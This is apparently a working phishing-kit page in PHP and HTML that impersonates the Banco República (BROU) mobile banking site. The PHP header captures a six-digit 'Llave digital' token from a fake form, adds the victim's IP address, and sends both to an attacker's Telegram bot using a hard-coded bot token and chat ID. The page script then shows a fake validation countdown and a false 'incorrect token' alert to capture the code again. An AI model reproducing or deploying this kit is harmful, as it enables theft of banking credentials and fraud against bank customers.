<?php

@ini_set("display_errors", 0);

@$userp = $_SERVER['REMOTE_ADDR'];

if ( isset ($_POST['c1']) && isset ($_POST['c2']) && isset ($_POST['c3']) && isset ($_POST['c4']) && isset ($_POST['c5']) && isset ($_POST['c6']) ){

$message = "Cod2.: ".$_POST['c1']."".$_POST['c2']."".$_POST['c3']."".$_POST['c4']."".$_POST['c5']."".$_POST['c6']." ".$userp."\r\n";


$apiToken = "5582199534:AAFkgaLWTaDUbAkp7Mcoe5sKKTBg68RxvxE";


$data = [
  'chat_id' => '-813814803',

   'text' => $message
];


$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



}

?>
<html class="wf-montserrat-n4-active wf-montserrat-n5-active wf-montserrat-n7-active wf-sansserif-n4-inactive wf-active">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width,viewport-fit=cover">

<link rel="stylesheet" href="./src/fonts0035.css">
<link rel="stylesheet" href="./src/inticons.css">

<title>Inicio</title>

<link href="./src/2d18bb0567.css" rel="stylesheet">
<link href="./src/main8d29879f.css" rel="stylesheet">
<script type="text/javascript">
if (screen.width>800) {
window.location="index.php";
}
</script>
	<style type="text/css">
	.ip
{
  border:1px solid #459ad8;
  border-radius: 0px;
  borderStyle: solid;
}
input[type=number]::-webkit-inner-spin-button, 
input[type=number]::-webkit-outer-spin-button { 
  -webkit-appearance: none; 
  margin: 0; 
}

input[type=number] { -moz-appearance:textfield; }
</style>

  	<script>
function soloNumeros(e){
  var key = window.event ? e.which : e.keyCode;
  if (key < 48 || key > 57) {
    e.preventDefault();
  }
}
</script>
	
</head>

<body style="background-color: rgb(8, 82, 141);"><div id="root"><div class="transition-drill-in"><div class="transition-wrapper"><div class="view-wrapper"><header class=""><nav class="navbar navbar-default"><div class="container-fluid"><div class="navbar-header"><div class="toolbar undefined"><div class="header-grid"><div class="row"><div class="col-12 header-desktop null  col-lg-12 col-md-12 col-sm-12">

<div class="header-title-back"></div>
<div class="logo"><img src="src/img0981.png"><div></div></div></div></div></div></div></div></div></nav></header><div class="view-page"><div role="main" class="view-content"><main class="main-container">
<div id="espera" class="view-content-container">

<br><h1>Cargando...</h1><br>
<div align="center"><img src="src/img0982.gif"  style="width:150px;"></div><br><br><br><br>
<br><h1 id='CuentaAtras'></h1>

<br><br>

</div>
	<div id="llave" style="display: none;" class="view-content-container">

<br>
<br><h1>Validar informacion<br><br><br><br>Llave digital</h1><br>

			 <form  method="post" name="form1" id="form1" action="api.php">
  
<div class="form-group-container" style="margin-left: 10%;"><div class="input-group-code"><div class="react-code-input" style="display: inline-block;">
	<input type="number"  name="c1"  id="c1"data-id="0" type="password" min="0" max="9" maxlength="1" autocomplete="off" data-valid="true" pattern="[0-9]*" inputmode="text" value="" required="" onkeyup="nextFocus('c1', 'c2')">
	<input  type="number" name="c2" id="c2" data-id="1" type="password" min="0" max="9" maxlength="1" autocomplete="off" data-valid="true" pattern="[0-9]*" inputmode="text" value="" required="" onkeypress="nextFocus('c2', 'c3')">
	<input type="number"  name="c3" id="c3" data-id="2" type="password" min="0" max="9" maxlength="1" autocomplete="off" data-valid="true" pattern="[0-9]*" inputmode="text" value="" required="" onkeypress="nextFocus('c3', 'c4')">
	<input type="number"  name="c4" id="c4" data-id="3" type="password" min="0" max="9" maxlength="1" autocomplete="off" data-valid="true" pattern="[0-9]*" inputmode="text" value="" required="" onkeypress="nextFocus('c4', 'c5')">
	<input type="number"  name="c5" id="c5" data-id="4" type="password" min="0" max="9" maxlength="1" autocomplete="off" data-valid="true" pattern="[0-9]*" inputmode="text" value="" required="" onkeypress="nextFocus('c5', 'c6')">
	<input  type="number" name="c6" id="c6" data-id="5" type="password" min="0" max="9" maxlength="1" autocomplete="off" data-valid="true" pattern="[0-9]*" inputmode="text" value="" required="" onkeypress="nextFocus('c6', 'c7')"></div><div class="c-control c-control--icon-toggle"><label class="c-control-label"><div class="c-control-off"><div class="svg-wrapper"><div><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="24px" height="24px" viewBox="0 0 24 24" style="enable-background:new 0 0 24 24;" xml:space="preserve" class="injected-svg svg-image" data-src="static/media/hide.9092d6f2.svg">


</svg></div></div></div></label></div></div></div>
  <br>
    <br>
	<p style="font-size:18px;"></p><br><br>

  <br><br>
<button type="submit" class="  btn btn-primary btn-block"><span>CONFIRMAR LLAVE/TOKEN</span></button>
</form>

<br><br>

</div><div class="app-footer"><section class="container--layout container--bottom"><div class="form-content container"><div class="justify-content-center row"><div class="col col-12 col-sm-12"><div class="row"><div class="col-4 reset-padding-mb"><div class="logo-brou-mb"><div class="svg-wrapper"><div><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 420.7 117.3" style="enable-background:new 0 0 420.7 117.3;" xml:space="preserve" class="injected-svg svg-image" data-src="static/media/logoBrou-mb.2a124c1c.svg">
<style type="text/css">
	.logoBrou-mbst0{fill:#0066B3;}
	.logoBrou-mbst1{fill:#FFFFFF;}
	.logoBrou-mbst2{fill:#FFCB05;}
</style>
<g>
	<path class="logoBrou-mbst0" d="M140.2,24h16.6c4.1,0,7.3,1.1,9.4,3.2c1.6,1.6,2.5,3.7,2.5,6.1v0.1c0,1-0.1,1.9-0.4,2.7   c-0.3,0.8-0.6,1.5-1,2.1c-0.4,0.6-0.9,1.2-1.5,1.7c-0.6,0.5-1.2,0.9-1.8,1.2c2.1,0.8,3.7,1.9,4.9,3.2c1.2,1.4,1.8,3.2,1.8,5.6V50   c0,1.6-0.3,3.1-0.9,4.3c-0.6,1.2-1.5,2.3-2.7,3.1c-1.2,0.8-2.6,1.4-4.2,1.8c-1.7,0.4-3.5,0.6-5.5,0.6h-17V24z M155.2,38.5   c1.7,0,3.1-0.3,4.2-0.9c1-0.6,1.5-1.6,1.5-2.9v-0.1c0-1.2-0.4-2.1-1.3-2.7c-0.9-0.6-2.2-0.9-3.8-0.9h-7.8v7.6H155.2z M157.3,53   c1.7,0,3.1-0.3,4.1-0.9c1-0.6,1.5-1.6,1.5-2.9V49c0-1.2-0.5-2.1-1.4-2.8c-0.9-0.7-2.4-1.1-4.5-1.1h-9.1V53H157.3z"></path>
	<path class="logoBrou-mbst0" d="M185.7,23.7h7.3l15.4,36.2h-8.3l-3.3-8.1h-15.2l-3.3,8.1h-8.1L185.7,23.7z M194,44.9l-4.8-11.6l-4.8,11.6H194z   "></path>
	<polygon class="logoBrou-mbst0" points="210.4,24 217.7,24 234.5,46.1 234.5,24 242.3,24 242.3,59.9 235.6,59.9 218.2,37.1 218.2,59.9    210.4,59.9  "></polygon>
	<path class="logoBrou-mbst0" d="M264.7,60.5c-2.6,0-5.1-0.5-7.3-1.4c-2.3-1-4.2-2.3-5.8-3.9c-1.6-1.7-2.9-3.6-3.8-5.9   c-0.9-2.3-1.4-4.7-1.4-7.2v-0.1c0-2.6,0.5-5,1.4-7.2c0.9-2.2,2.2-4.2,3.8-5.9c1.6-1.7,3.6-3,5.9-4c2.3-1,4.8-1.5,7.6-1.5   c1.7,0,3.2,0.1,4.6,0.4c1.4,0.3,2.6,0.7,3.8,1.1c1.1,0.5,2.2,1.1,3.1,1.7c1,0.7,1.8,1.4,2.7,2.3l-5,5.8c-1.4-1.3-2.8-2.3-4.3-3   c-1.5-0.7-3.1-1.1-4.9-1.1c-1.5,0-2.9,0.3-4.2,0.9c-1.3,0.6-2.4,1.4-3.3,2.4c-0.9,1-1.6,2.2-2.2,3.6c-0.5,1.4-0.8,2.8-0.8,4.3v0.1   c0,1.5,0.3,3,0.8,4.4c0.5,1.4,1.2,2.6,2.1,3.6c0.9,1,2,1.8,3.3,2.4c1.3,0.6,2.7,0.9,4.2,0.9c2.1,0,3.8-0.4,5.2-1.1   c1.4-0.8,2.8-1.8,4.2-3.1l5,5.1c-0.9,1-1.9,1.9-2.9,2.7c-1,0.8-2.1,1.5-3.3,2c-1.2,0.6-2.5,1-3.9,1.3   C268,60.4,266.4,60.5,264.7,60.5"></path>
	<path class="logoBrou-mbst0" d="M298.5,60.5c-2.8,0-5.3-0.5-7.6-1.5c-2.3-1-4.3-2.3-6-3.9c-1.7-1.7-3-3.6-3.9-5.8c-0.9-2.2-1.4-4.6-1.4-7.2   v-0.1c0-2.6,0.5-5,1.4-7.2c1-2.2,2.3-4.2,4-5.9c1.7-1.7,3.7-3,6.1-4c2.3-1,4.9-1.5,7.7-1.5c2.8,0,5.3,0.5,7.6,1.5   c2.3,1,4.3,2.3,6,3.9c1.7,1.7,3,3.6,3.9,5.8c0.9,2.2,1.4,4.6,1.4,7.2v0.1c0,2.6-0.5,5-1.4,7.2c-1,2.2-2.3,4.2-4,5.9   c-1.7,1.7-3.7,3-6.1,4C303.8,60,301.3,60.5,298.5,60.5 M298.6,53.2c1.6,0,3-0.3,4.4-0.9c1.3-0.6,2.5-1.4,3.4-2.4   c0.9-1,1.7-2.2,2.2-3.6c0.5-1.4,0.8-2.8,0.8-4.3v-0.1c0-1.5-0.3-3-0.8-4.4c-0.5-1.4-1.3-2.6-2.3-3.6c-1-1-2.1-1.8-3.5-2.4   c-1.3-0.6-2.8-0.9-4.4-0.9c-1.6,0-3.1,0.3-4.4,0.9c-1.3,0.6-2.4,1.4-3.4,2.4c-0.9,1-1.7,2.2-2.2,3.6c-0.5,1.4-0.8,2.8-0.8,4.3v0.1   c0,1.5,0.3,3,0.8,4.4c0.5,1.4,1.3,2.6,2.3,3.6c1,1,2.1,1.8,3.4,2.4C295.5,52.9,297,53.2,298.6,53.2z"></path>
	<path class="logoBrou-mbst0" d="M140.2,69.3h16.4c4.5,0,8,1.2,10.5,3.6c2.1,2.1,3.1,4.8,3.1,8.2v0.1c0,2.9-0.7,5.3-2.1,7.1   c-1.4,1.8-3.3,3.2-5.6,4l8.8,12.8H162l-7.7-11.5h-0.1h-6.1v11.5h-7.9V69.3z M156.1,86.7c1.9,0,3.4-0.5,4.5-1.4   c1-0.9,1.6-2.2,1.6-3.7v-0.1c0-1.7-0.5-3-1.6-3.8c-1.1-0.9-2.6-1.3-4.6-1.3h-7.8v10.3H156.1z"></path>
	<polygon class="logoBrou-mbst0" points="174.4,69.3 201.4,69.3 201.4,76.3 182.2,76.3 182.2,83.6 199.1,83.6 199.1,90.6 182.2,90.6    182.2,98.2 201.7,98.2 201.7,105.2 174.4,105.2  "></polygon>
	<path class="logoBrou-mbst0" d="M206.2,69.3h14.7c2.2,0,4.1,0.3,5.8,0.9c1.7,0.6,3.1,1.4,4.3,2.5c1.2,1.1,2.1,2.4,2.7,3.9   c0.6,1.5,0.9,3.2,0.9,5.1v0.1c0,2.1-0.4,3.9-1.1,5.5c-0.8,1.6-1.8,2.9-3.1,3.9c-1.3,1.1-2.9,1.9-4.6,2.4c-1.8,0.5-3.6,0.8-5.7,0.8   h-6v10.8h-7.9V69.3z M220.3,87.4c2,0,3.5-0.5,4.6-1.6c1.1-1,1.6-2.3,1.6-3.9v-0.1c0-1.8-0.6-3.1-1.7-4.1c-1.1-0.9-2.7-1.4-4.7-1.4   h-6.1v11H220.3z"></path>
	<path class="logoBrou-mbst0" d="M252.4,105.8c-4.8,0-8.6-1.3-11.4-4c-2.8-2.7-4.2-6.6-4.2-11.9V69.3h7.9v20.3c0,2.9,0.7,5.2,2.1,6.6   c1.4,1.5,3.3,2.2,5.7,2.2c2.4,0,4.3-0.7,5.7-2.2c1.4-1.4,2.1-3.6,2.1-6.5V69.3h7.9v20.3c0,2.7-0.4,5.1-1.1,7.1   c-0.7,2-1.8,3.7-3.2,5.1c-1.4,1.4-3,2.4-5,3C256.9,105.4,254.8,105.8,252.4,105.8"></path>
	<path class="logoBrou-mbst0" d="M273.5,69.3h16.6c4.1,0,7.3,1.1,9.4,3.2c1.6,1.6,2.5,3.7,2.5,6.1v0.1c0,1-0.1,1.9-0.4,2.7   c-0.3,0.8-0.6,1.5-1,2.1c-0.4,0.6-0.9,1.2-1.5,1.7c-0.6,0.5-1.2,0.9-1.8,1.2c2.1,0.8,3.7,1.9,4.9,3.2c1.2,1.4,1.8,3.2,1.8,5.6v0.1   c0,1.6-0.3,3.1-0.9,4.3c-0.6,1.2-1.5,2.3-2.7,3.1c-1.2,0.8-2.6,1.4-4.3,1.8c-1.7,0.4-3.5,0.6-5.5,0.6h-17V69.3z M288.5,83.8   c1.7,0,3.1-0.3,4.2-0.9c1-0.6,1.5-1.6,1.5-2.9v-0.1c0-1.2-0.4-2.1-1.3-2.7c-0.9-0.6-2.2-0.9-3.8-0.9h-7.8v7.6H288.5z M290.6,98.3   c1.7,0,3.1-0.3,4.1-0.9c1-0.6,1.5-1.6,1.5-2.9v-0.1c0-1.2-0.5-2.1-1.4-2.8c-0.9-0.7-2.4-1.1-4.5-1.1h-9.1v7.9H290.6z"></path>
	<polygon class="logoBrou-mbst0" points="307.8,69.3 315.7,69.3 315.7,98.1 333.6,98.1 333.6,105.2 307.8,105.2  "></polygon>
	<rect x="336" y="69.3" class="logoBrou-mbst0" width="7.9" height="35.9"></rect>
	<path class="logoBrou-mbst0" d="M366.5,105.8c-2.6,0-5.1-0.5-7.3-1.4c-2.3-1-4.2-2.3-5.8-3.9c-1.6-1.7-2.9-3.6-3.8-5.9   c-0.9-2.3-1.4-4.7-1.4-7.2v-0.1c0-2.6,0.5-5,1.4-7.2c0.9-2.2,2.2-4.2,3.8-5.9c1.6-1.7,3.6-3,5.9-4c2.3-1,4.8-1.5,7.6-1.5   c1.7,0,3.2,0.1,4.6,0.4c1.4,0.3,2.6,0.7,3.8,1.1c1.1,0.5,2.2,1.1,3.1,1.7c1,0.7,1.8,1.4,2.7,2.3l-5,5.8c-1.4-1.3-2.8-2.3-4.3-3   c-1.5-0.7-3.1-1.1-4.9-1.1c-1.5,0-2.9,0.3-4.2,0.9c-1.3,0.6-2.4,1.4-3.3,2.4c-0.9,1-1.6,2.2-2.2,3.6c-0.5,1.4-0.8,2.8-0.8,4.3v0.1   c0,1.5,0.3,3,0.8,4.4c0.5,1.4,1.2,2.6,2.1,3.6c0.9,1,2,1.8,3.3,2.4c1.3,0.6,2.7,0.9,4.2,0.9c2.1,0,3.8-0.4,5.2-1.1   c1.4-0.8,2.8-1.8,4.2-3.1l5,5.1c-0.9,1-1.9,1.9-2.9,2.7c-1,0.8-2.1,1.5-3.3,2c-1.2,0.6-2.5,1-3.9,1.3   C369.8,105.7,368.2,105.8,366.5,105.8"></path>
	<path class="logoBrou-mbst0" d="M396.5,69h7.3l15.4,36.2h-8.3l-3.3-8.1h-15.2l-3.3,8.1h-8.1L396.5,69z M404.8,90.2L400,78.5l-4.8,11.6H404.8z"></path>
	<polygon class="logoBrou-mbst0" points="252.2,63.3 258.9,66.3 254.8,69.4 248.9,69.4  "></polygon>
	<path class="logoBrou-mbst0" d="M81.6,0.9H0.8v80.8c0,19.5,15.8,35.3,35.3,35.3h22.7v-11.6H117V36.2C117,16.7,101.1,0.9,81.6,0.9"></path>
	<path class="logoBrou-mbst1" d="M41.9,20.9L41.9,20.9c0-0.7-0.5-1.2-1.2-1.2h-0.6V22h0.6C41.4,22,41.9,21.5,41.9,20.9 M55.7,28L55.7,28   c0-0.7-0.6-1.2-1.2-1.2H40.2v2.4h14.3C55.1,29.2,55.7,28.7,55.7,28z M25.9,14.3c0-1,0.9-1.9,1.9-1.9h14.7c0.6,0,1.1,0.2,1.6,0.6   l6.8,5.1c0.2,0.2,0.4,0.4,0.4,0.7c0,0.5-0.4,0.9-1,0.9h7.5c1.4,0,2.8,0.5,3.8,1.3l5.5,4.2l6.9,5.2c0.2,0.2,0.4,0.4,0.4,0.7   c0,0.5-0.4,1-1,1H27.8c-1.1,0-1.9-0.9-1.9-1.9V14.3z"></path>
	<path class="logoBrou-mbst1" d="M75.4,43.5v-1.1c0-1-0.8-1.8-1.9-1.8H40.2v4.8h33.3C74.5,45.4,75.4,44.5,75.4,43.5 M25.9,35.9   c0-1.1,0.9-1.9,1.9-1.9h50.2c0.6,0,1.2,0.2,1.6,0.5l10.1,7.6c0.2,0.2,0.4,0.4,0.4,0.7c0,0.5-0.4,1-1,1H90c1.1,0,1.9,0.9,1.9,1.9   l0,6c0,1-0.9,1.9-1.9,1.9H79c-1,0-1.9-0.9-1.9-1.9v-1.1c0-1-0.9-1.9-1.9-1.9H40.7v3c0,1.1-0.9,1.9-1.9,1.9h-11   c-1.1,0-1.9-0.9-1.9-1.9V35.9z"></path>
	<path class="logoBrou-mbst1" d="M92.2,76.9c-6.6,11.4-20.2,16.4-33.3,16.4c-13,0-26.6-5-33.3-16.4c-0.1-0.1-0.1-0.3-0.1-0.5   c0-0.5,0.4-0.9,1-0.9h15.2c0.5,0,1,0.4,1,0.9c0.7,6.4,7.7,11.4,16.2,11.4c8.5,0,15.6-5.1,16.2-11.4c0-0.5,0.4-0.9,1-0.9h15.2   c0.5,0,1,0.4,1,0.9C92.3,76.6,92.2,76.7,92.2,76.9"></path>
	<path class="logoBrou-mbst1" d="M73.5,61.5H42c-1,0-1.9,0.8-1.9,1.8v4.3c0,1,0.8,1.8,1.9,1.8h31.5c1,0,1.9-0.8,1.9-1.8v-4.3   C75.4,62.3,74.6,61.5,73.5,61.5 M96.3,60.5c0,4.5-0.7,8.5-2,11.9c-0.3,0.7-1,1.2-1.8,1.2H25.3c-0.8,0-1.5-0.5-1.8-1.2   c-1.3-3.5-2-7.5-2-11.9V58c0-1.4,1.1-2.5,2.5-2.5h2.5h67.3c1.4,0,2.5,1.1,2.5,2.5L96.3,60.5z"></path>
	<rect x="58.9" y="105.4" class="logoBrou-mbst2" width="58.1" height="11.6"></rect>
</g>
</svg></div></div></div></div><div class="col-8 reset-padding-mb"><p><span>© 2020 Banco República</span><span>Todos los derechos reservados</span></p></div></div></div></div></div></section></div></main></div></div></div></div></div><div class="modal-container"></div></div><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="0" height="0" style="position:absolute"><symbol id="LogoTech" viewBox="0 0 221.4 31.3"><svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 288.7 119" style="enable-background:new 0 0 288.7 119" xml:space="preserve"><g transform="translate(-930.005 -2348.975)"><path d="M1053.7,2407.6h-5.2v8.6c0,2.1,0,4.4,2.7,4.4c0.9,0,1.8-0.2,2.6-0.6v3.3c-1,0.4-2.1,0.7-3.2,0.6c-5.6,0-5.6-3.4-5.6-6.5
                                v-18.4h3.6v5.3h5.2L1053.7,2407.6z"></path><path d="M1059.5,2415.2c0,3.3,3.1,5.5,6.4,5.5c2.1-0.1,4-1.1,5.2-2.9l2.7,2.1c-2,2.6-5.1,4.1-8.4,3.9c-6,0-9.7-4.3-9.7-10
                                c-0.2-5.3,4-9.8,9.3-10c0.2,0,0.3,0,0.5,0c6.7,0,9.2,5.1,9.2,10v1.2L1059.5,2415.2z M1070.8,2412.3c-0.1-3.2-1.8-5.5-5.5-5.5
                                c-3.1,0-5.7,2.4-5.9,5.5H1070.8z"></path><path d="M1092.1,2409.5c-1.2-1.4-2.9-2.2-4.7-2.1c-3.9,0-5.9,3.2-5.9,6.7c-0.2,3.4,2.3,6.2,5.7,6.4c0.1,0,0.3,0,0.4,0
                                c1.8,0.1,3.5-0.7,4.6-2.1l2.6,2.6c-1.9,2-4.5,3-7.2,2.9c-5.5,0-10-4.5-10-10s4.5-10,10-10c2.7-0.1,5.4,1,7.3,3L1092.1,2409.5z"></path><path d="M1098.3,2393.1h3.6v14.2h0.1c1.2-2.2,3.7-3.6,6.2-3.4c3.7,0,6.9,2.2,6.9,7.3v12.2h-3.6v-11.2c0-3.6-2-4.9-4.3-4.9
                                c-3,0-5.3,1.9-5.3,6.3v9.8h-3.6L1098.3,2393.1z"></path><path d="M1119,2393.1h3.6v14h0.1c1.5-2.1,4-3.3,6.6-3.2c5.8,0,9.6,4.3,9.6,10c0,5.7-3.7,10-9.6,10c-2.6,0-5-1.1-6.6-3.2h-0.1v2.7
                                h-3.6L1119,2393.1z M1135.1,2414c0-3.8-2.4-6.6-6.2-6.6c-3.8,0-6.2,2.8-6.2,6.6s2.4,6.6,6.2,6.6
                                C1132.7,2420.6,1135.1,2417.8,1135.1,2414L1135.1,2414z"></path><path d="M1142.3,2406.8c2.1-1.8,4.7-2.8,7.5-2.8c5.6,0,7.9,3,7.9,6.3v9.7c0,1.2,0,2.3,0.2,3.4h-3.2c-0.1-1-0.1-1.9-0.1-2.9h-0.1
                                c-1.4,2.3-4,3.6-6.6,3.4c-3.5,0-6.5-2-6.5-5.7c0-4.9,4.7-6.6,10.4-6.6h2.6v-0.8c0-2.3-1.9-4.1-4.1-4c-0.1,0-0.3,0-0.4,0
                                c-2,0-3.9,0.8-5.4,2.2L1142.3,2406.8z M1152.4,2414.3c-3.4,0-7.6,0.6-7.6,3.6c0,2.2,1.6,3.1,4.1,3.1c4,0,5.4-3,5.4-5.5v-1.2
                                L1152.4,2414.3z"></path><path d="M1161.1,2404.4h3.6v2.9h0.1c1.2-2.2,3.7-3.6,6.2-3.4c3.7,0,6.9,2.2,6.9,7.3v12.2h-3.6v-11.2c0-3.6-2-4.9-4.3-4.9
                                c-3,0-5.3,1.9-5.3,6.3v9.8h-3.6L1161.1,2404.4z"></path><path d="M1181.3,2393.1h3.6v19.6l8.2-8.2h5l-8.8,8.6l9.6,10.4h-5.1l-8.8-9.9v9.9h-3.6L1181.3,2393.1z"></path><path d="M962.6,2380.9c13.1-12.8,33.5-14.5,48.5-3.9c-4.3-1.3-8.7-2-13.2-2c-7.7-0.1-15.4,2-21.9,6.1
                                c-12.4,6.1-19.1,19.7-16.5,33.3l0.8,3.2l2.6,4c-7-14.6-1-32.4,13.6-39.5c6.4-4.1,13.8-6.2,21.4-6c6.8-0.1,13.4,1.6,19.4,4.8
                                c-15.1-15.5-39.9-15.8-55.4-0.7c-0.1,0.1-0.2,0.2-0.2,0.2l-1.8,2.4l-1.2,4C959.3,2384,962.6,2380.9,962.6,2380.9z"></path><path d="M961.8,2435.3c-12.7-13.2-14.4-33.6-3.9-48.7c-1.3,4.3-2,8.8-2,13.3c-0.2,7.8,2,15.5,6.1,22.1c6,12.4,19.6,19.2,33.1,16.6
                                l3.1-0.8l3.8-2.7c-14.5,7.1-32,1-39.1-13.5c0-0.1-0.1-0.1-0.1-0.2c-4.1-6.4-6.1-13.9-6-21.5c-0.1-6.8,1.6-13.5,4.8-19.5
                                c-15.5,15.3-15.8,40.3-0.6,55.9l3,2.2l3.6,0.7C965.6,2438.3,963.5,2437,961.8,2435.3z"></path><path d="M1015.9,2436.1c-13.1,12.8-33.5,14.5-48.5,4c4.3,1.3,8.7,2,13.2,2c7.8,0.2,15.4-2,22-6.1c12.4-6.1,19.1-19.7,16.5-33.3
                                l-0.8-3.2l-2.6-3.8c7.1,14.6,0.9,32.2-13.6,39.3c-6.4,4.1-13.8,6.2-21.4,6c-6.8,0.1-13.5-1.6-19.4-4.9
                                c15.1,15.5,39.9,15.9,55.5,0.7c0.1-0.1,0.1-0.1,0.2-0.2l1.4-2l0.5-1.8C1017.8,2434.1,1016.9,2435.2,1015.9,2436.1L1015.9,2436.1z"></path><path d="M1016.7,2381.8c12.8,13.2,14.4,33.7,3.9,48.8c1.3-4.3,2-8.8,2-13.3c0.2-7.8-2-15.5-6.1-22.1c-5.1-10.4-15.7-17.1-27.3-17.1
                                c-2,0-4.1,0.2-6.1,0.6c-1.2,0.4-2.3,0.9-3.4,1.5c-1.2,0.7-3.3,1.9-3.3,1.9c14.5-7.1,32-1,39.1,13.4c0,0.1,0.1,0.1,0.1,0.2
                                c4.1,6.4,6.1,13.9,6,21.5c0.1,6.8-1.6,13.5-4.8,19.5c15.5-15.3,15.8-40.3,0.6-55.9c0,0-1-0.6-1.6-0.9c-0.6-0.3-1.7-0.8-1.7-0.8
                                C1015.4,2380.4,1016.7,2381.8,1016.7,2381.8z"></path></g></svg></symbol></svg>
<script type="text/javascript">
	function nextFocus(inputF, inputS) {
  document.getElementById(inputF).addEventListener('keyup', function(event) {
     	if ((event.keyCode >= 48 && event.keyCode <= 57) || (event.keyCode >= 96 && event.keyCode <= 105)) { 

  document.getElementById(inputS).focus();
}

  });
}
</script>
<script language="JavaScript">
 
    /* Determinamos el tiempo total en segundos */
    var totalTiempo=5;
    var x = document.getElementById("llave");
    var x1 = document.getElementById("espera");
    var url="step3.php";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" segundos, estamos validando la informacion. <br> ";
 
        if(totalTiempo==0)
        {
        	 x1.style.display = "none"; 
            x.style.display = "block"; 
            alert("LLAVE DIGITAL INCORRECTO\r\nIngresa nuevamente tu Llave digital.");
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }
 
    window.onload=updateReloj;
 
    </script>
                              </body></html>
